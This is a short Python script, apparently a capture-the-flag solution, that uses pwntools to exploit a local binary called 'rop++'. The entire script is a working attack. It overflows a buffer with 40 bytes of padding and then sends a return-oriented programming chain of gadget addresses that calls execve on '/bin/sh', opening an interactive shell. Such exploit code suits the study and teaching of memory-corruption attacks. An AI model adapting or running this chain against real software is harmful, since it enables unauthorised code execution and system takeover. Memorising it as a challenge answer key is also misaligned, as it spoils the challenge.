import pwn

pwn.context.log_level = "debug"

p = pwn.process("rop++/rop++/share/chal")

p.recvuntil(b"show me rop\n> ")

payload = pwn.flat([
    b"A" * 40,
    pwn.p64(0x401e3f),  # pop rdi; ret
    pwn.p64(0x7fffffffd940),  # /bin/sh
    pwn.p64(0x409e6e),  # pop rsi; ret
    pwn.p64(0),

    pwn.p64(0x47ed0a),  # pop rax ; pop rdx ; pop rbx ; ret
    pwn.p64(0x3b),  # rax (syscall execve)
    pwn.p64(0x0),  # rdx
    pwn.p64(0x1234),  # rbx (useless)

    pwn.p64(0x401bf4),  # syscall
    b"/bin/sh",
])

p.sendline(payload)
p.interactive()
